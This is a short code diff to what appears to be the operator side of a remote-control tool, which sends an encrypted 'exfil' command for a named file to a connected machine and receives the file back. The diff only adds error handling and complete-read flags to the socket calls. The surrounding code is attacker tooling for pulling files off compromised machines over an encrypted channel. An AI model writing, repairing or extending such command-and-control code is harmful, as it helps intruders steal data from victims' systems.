@@ -84,8 +84,12 @@ while True:
 
                 conn.sendall(encrypt_tdes(key, f"exfil {filename}".encode()))
                 
-                img_size = decrypt_aes(key, conn.recv(1024)).decode()
-                rec_msg = conn.recv(int(img_size), socket.MSG_WAITALL)
+                try:
+                    img_size = decrypt_aes(key, conn.recv(1024)).decode()
+                    rec_msg = conn.recv(int(img_size), socket.MSG_WAITALL)
+                except UnicodeDecodeError:
+                    print("Try command again")
+                    break
 
                 response = decrypt_aes(key, rec_msg)
                 
@@ -102,7 +106,7 @@ while True:
     
             while True:
                 try:
-                    r = decrypt_tdes(key, conn.recv(4096)).decode()
+                    r = decrypt_tdes(key, conn.recv(4096, socket.MSG_WAITALL)).decode()
                 except UnicodeDecodeError:
                     print("Try command again")
                     break
